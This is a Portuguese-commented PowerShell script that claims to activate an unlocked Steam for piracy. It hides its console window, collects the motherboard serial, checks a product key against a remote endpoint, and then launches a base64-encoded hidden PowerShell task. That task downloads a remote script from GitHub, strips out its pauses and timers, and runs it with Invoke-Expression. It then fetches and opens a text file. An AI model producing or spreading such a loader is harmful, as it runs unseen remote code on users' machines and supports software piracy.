# 1. Oculta a janela inicial (Console)
$showWindow = '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);'
$type = Add-Type -MemberDefinition $showWindow -Name "Win32ShowWindow" -Namespace "Win32" -PassThru
$type::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Add-Type -AssemblyName Microsoft.VisualBasic, System.Windows.Forms

# Captura HWID e Key
$hwid = (Get-CimInstance Win32_BaseBoard).SerialNumber.Trim()
$key = [Microsoft.VisualBasic.Interaction]::InputBox("Insira sua chave do produto:", "ATIVAR STEAM DESBLOQUEADA", "")

if (-not $key) { exit }

try {
    $url = "https://waedqlfiprmsdkwhjkea.supabase.co/functions/v1/smooth-worker"
    $body = @{ key = $key; hwid = $hwid } | ConvertTo-Json
    $auth = Invoke-RestMethod -Uri $url -Method Post -Body $body -ContentType "application/json" -UserAgent "Mozilla/5.0"

    if ($auth.status -eq "authorized") {

        [System.Windows.Forms.MessageBox]::Show("STEAM DESBLOQUEADA ATIVADA PERMANENTEMENTE`n(Qualquer erro ative novamente com a mesma chave)`n`nO download iniciou e pode levar cerca de 1 a 2 minutos. Aguarde.", "Sucesso")

        $bgTask = @'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

try {
    $rawScript = Invoke-RestMethod -Uri 'https://raw.githubusercontent.com/VenezzaX/SteamFunDependencies/refs/heads/main/steampro.ps1'

    # === METODO 1: LINHA POR LINHA ===
    $linhas = $rawScript -split '\r?\n'
    $scriptLimpo = [System.Collections.Generic.List[string]]::new()

    foreach ($linha in $linhas) {

        # Bloqueia qualquer variação de ReadKey
        if ($linha -match 'ReadKey') {
            $scriptLimpo.Add('Start-Sleep -Milliseconds 1')
            continue
        }

        # Bloqueia KeyAvailable (usado em loops de espera)
        if ($linha -match 'KeyAvailable') {
            $scriptLimpo.Add('if ($false) {')
            continue
        }

        # Zera qualquer timer do Millennium (milleniumTimer ou millenniumTimer)
        if ($linha -match 'mill[eo]niumTimer\s*=') {
            $scriptLimpo.Add('$milleniumTimer = 0')
            $scriptLimpo.Add('$millenniumTimer = 0')
            continue
        }

        # Bloqueia pause/read-host que possam causar travamento
        if ($linha -match '^\s*Read-Host\s*$') {
            $scriptLimpo.Add('Start-Sleep -Milliseconds 1')
            continue
        }

        # Bloqueia Start-Sleep muito longos (acima de 10s) — substitui por 1s
        if ($linha -match 'Start-Sleep\s+-Seconds\s+(\d+)') {
            $segundos = [int]$Matches[1]
            if ($segundos -gt 10) {
                $scriptLimpo.Add('Start-Sleep -Seconds 1')
                continue
            }
        }

        $scriptLimpo.Add($linha)
    }

    $s = $scriptLimpo -join "`n"

    # === METODO 2: REGEX GLOBAL COMO FALLBACK (caso algo tenha escapado) ===
    # Qualquer [Algo]::ReadKey(...) vira um 0 silencioso
    $s = [regex]::Replace($s, '\[[\w\.]+\]::ReadKey\([^)]*\)', '0')

    # Qualquer [Algo]::KeyAvailable vira $false
    $s = [regex]::Replace($s, '\[[\w\.]+\]::KeyAvailable', '$false')

    # Zera timers com qualquer grafia
    $s = [regex]::Replace($s, '\$mill[eo]niumTimer\s*=\s*\d+', '$milleniumTimer = 0')

    # Qualquer while ($true) que dependa de KeyAvailable — mata o loop
    $s = [regex]::Replace($s, 'while\s*\(\s*\[[\w\.]+\]::KeyAvailable', 'while ($false) { #')

    # === METODO 3: SUBSTITUIÇÃO DIRETA DE STRINGS CONHECIDAS ===
    $s = $s.Replace('[System.Console]::ReadKey($true)', '0')
    $s = $s.Replace('[System.Console]::ReadKey()', '0')
    $s = $s.Replace('[Console]::ReadKey($true)', '0')
    $s = $s.Replace('[Console]::ReadKey()', '0')
    $s = $s.Replace('[Console]::KeyAvailable', '$false')
    $s = $s.Replace('[System.Console]::KeyAvailable', '$false')

    # Executa o script limpo
    Invoke-Expression $s

    # Baixa aviso e abre no notepad
    $wUrl = 'https://raw.githubusercontent.com/RicoSteam/SteamMethod/refs/heads/main/warning.txt'
    $path = "$env:TEMP\warning.txt"
    (New-Object System.Net.WebClient).DownloadFile($wUrl, $path)
    Start-Process notepad.exe $path

} catch {}
'@

        $encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($bgTask))

        Start-Process powershell.exe -ArgumentList "-NoProfile", "-WindowStyle Hidden", "-EncodedCommand", $encoded -WindowStyle Hidden

        exit

    } else {
        [System.Windows.Forms.MessageBox]::Show("Chave inválida ou já vinculada a outro computador.", "Acesso Negado")
    }
} catch {
    [System.Windows.Forms.MessageBox]::Show("Erro ao validar: Verifique sua chave ou network.`n`nDetalhe: $($_.Exception.Message)", "Erro")
}
